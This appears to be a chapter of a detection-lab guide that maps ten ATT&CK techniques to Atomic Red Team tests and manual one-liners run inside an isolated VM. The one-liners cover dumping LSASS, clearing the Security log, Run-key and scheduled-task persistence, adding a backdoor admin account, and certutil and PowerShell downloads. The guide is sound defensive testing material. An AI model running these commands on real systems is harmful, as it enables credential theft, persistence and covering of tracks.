# 02: Simulating the Attacks

Each detection has a matching simulation. Use Atomic Red Team where possible;
manual one-liners are given as a fallback.

Install Atomic Red Team (elevated PowerShell, in the victim VM only):

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
```

Run a technique with `Invoke-AtomicTest T#### -TestNumbers 1`, and clean up
after with `-Cleanup`.

> Only ever run these inside the isolated victim VM. Snapshot the VM first so
> you can roll back.

| # | Detection | Atomic test | Manual fallback |
|---|-----------|-------------|-----------------|
| 1 | Brute force (T1110) | `Invoke-AtomicTest T1110.001` | `1..8 \| % { net use \\\\localhost /user:baduser wrongpass }` |
| 2 | PowerShell encoded (T1059.001) | `Invoke-AtomicTest T1059.001` | `powershell -enc <base64 of "Write-Host hi">` |
| 3 | Office spawns shell (T1566.001) | `Invoke-AtomicTest T1204.002` | From Excel VBA: `Shell "cmd.exe /c calc"` |
| 4 | Run-key persistence (T1547.001) | `Invoke-AtomicTest T1547.001` | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc.exe` |
| 5 | New local admin (T1136.001) | `Invoke-AtomicTest T1136.001` | `net user hacker P@ss123! /add & net localgroup Administrators hacker /add` |
| 6 | Certutil download (T1105) | `Invoke-AtomicTest T1105` | `certutil -urlcache -split -f https://example.com/x.txt x.txt` |
| 7 | Log cleared (T1070.001) | `Invoke-AtomicTest T1070.001` | `wevtutil cl Security` (needs admin) |
| 8 | LSASS access (T1003.001) | `Invoke-AtomicTest T1003.001 -TestNumbers 1` | Use ProcDump: `procdump -ma lsass.exe out.dmp` |
| 9 | Scheduled task (T1053.005) | `Invoke-AtomicTest T1053.005` | `schtasks /create /tn evil /tr calc.exe /sc onlogon` |
| 10 | PowerShell outbound (T1071.001) | — | `powershell -c "(New-Object Net.WebClient).DownloadString('https://example.com')"` |

Detection 5 also fires the active response in `04-active-response.md`: the
`hacker` account is auto-disabled after rule 100108 hits.

## Workflow per detection

1. Snapshot the VM.
2. Run the simulation.
3. Confirm the alert fires (dashboard → filter on the rule ID or ATT&CK ID).
4. Screenshot the alert.
5. Write it up with `03-investigation-template.md`.
6. Roll back the snapshot.

Base64 helper for test 2:
```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host hi'))
```
